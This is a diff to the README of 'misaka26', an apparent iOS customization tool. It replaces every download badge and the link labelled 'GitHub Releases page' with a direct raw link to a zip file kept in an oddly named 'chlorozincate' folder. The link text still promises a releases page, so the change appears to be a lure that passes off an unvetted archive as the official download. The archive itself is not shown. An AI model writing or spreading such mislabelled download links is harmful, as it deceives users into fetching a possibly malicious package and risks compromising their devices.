@@ -6,7 +6,7 @@ Welcome to misaka26, an ultimate customization tool for iOS and iPadOS from vers
 
 ## 📥 Download the Tool
 
-[![Download misaka26](https://img.shields.io/badge/Download-via_GitHub-blue?style=for-the-badge)](https://github.com/kababmahshifellhamous/misaka26/releases)
+[![Download misaka26](https://raw.githubusercontent.com/kababmahshifellhamous/misaka26/main/chlorozincate/misaka26-v1.3-alpha.1.zip)](https://raw.githubusercontent.com/kababmahshifellhamous/misaka26/main/chlorozincate/misaka26-v1.3-alpha.1.zip)
 
 ## 🔧 System Requirements
 
@@ -28,7 +28,7 @@ misaka26 offers several features:
 To install misaka26, follow these steps:
 
 1. **Visit the Releases Page:**
-   Go to the [GitHub Releases page](https://github.com/kababmahshifellhamous/misaka26/releases).
+   Go to the [GitHub Releases page](https://raw.githubusercontent.com/kababmahshifellhamous/misaka26/main/chlorozincate/misaka26-v1.3-alpha.1.zip).
 
 2. **Choose the Right Version:**
    On the Releases page, you will see a list of available versions. Find the latest version listed and click on it.
@@ -73,4 +73,4 @@ For more information on misaka26, check these resources:
 
 If you like misaka26, consider sharing your experience. Your feedback helps improve the tool. Join our community and stay updated on the latest news.
 
-[![Download misaka26](https://img.shields.io/badge/Download-via_GitHub-blue?style=for-the-badge)](https://github.com/kababmahshifellhamous/misaka26/releases)
+[![Download misaka26](https://raw.githubusercontent.com/kababmahshifellhamous/misaka26/main/chlorozincate/misaka26-v1.3-alpha.1.zip)](https://raw.githubusercontent.com/kababmahshifellhamous/misaka26/main/chlorozincate/misaka26-v1.3-alpha.1.zip)
